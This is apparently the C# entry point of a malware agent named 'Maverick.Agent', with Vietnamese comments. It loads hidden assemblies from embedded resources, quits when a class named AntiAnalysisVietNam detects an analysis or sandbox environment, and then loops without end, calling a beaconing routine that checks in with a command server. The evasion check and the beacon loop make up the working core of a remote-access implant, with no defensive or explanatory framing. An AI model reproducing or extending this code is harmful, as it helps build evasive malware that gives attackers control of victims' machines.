using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Maverick.Agent
{
    internal class Program
    {
        static Program()
        {
            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string name = new AssemblyName(args.Name).Name + ".dll";

                // Load from embedded resources
                var resourceName = Assembly.GetExecutingAssembly()
                    .GetManifestResourceNames()
                    .FirstOrDefault(r => r.EndsWith(name));

                if (resourceName != null)
                {
                    using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                    {
                        byte[] data = new byte[stream.Length];
                        stream.Read(data, 0, data.Length);
                        return Assembly.Load(data);
                    }
                }

                return null;
            };
        }

        public static void Main()
        {
            if (AntiAnalysisVietNam.IsSuspiciousEnvironment())
            {
                return;
            }
            try
            {
                if(AntiAnalysisVietNam.IsSuspiciousEnvironment())
                {
                    return;
                }
                //
            }
            catch (Exception)
            {
            }
            int num = 0;
            while(Program.isConnected)
            {
                Thread.Sleep(2000);
                num++;
                if (num >= 30)
                {
                    if (!AntiAnalysisVietNam.ShouldContinueExecution())
                    {
                        isConnected = false;
                    }
                    System.Threading.Thread.Sleep(10000); //nghi ngoi
                    num = 0;
                }
                //_ = Task.Run(async () =>
                //{
                //    await CommandSender.BeaconingAsync();
                //});

                CommandSender.BeaconingAsync().Wait();

            }

        }
        
        private static bool isConnected = true;
    }
}
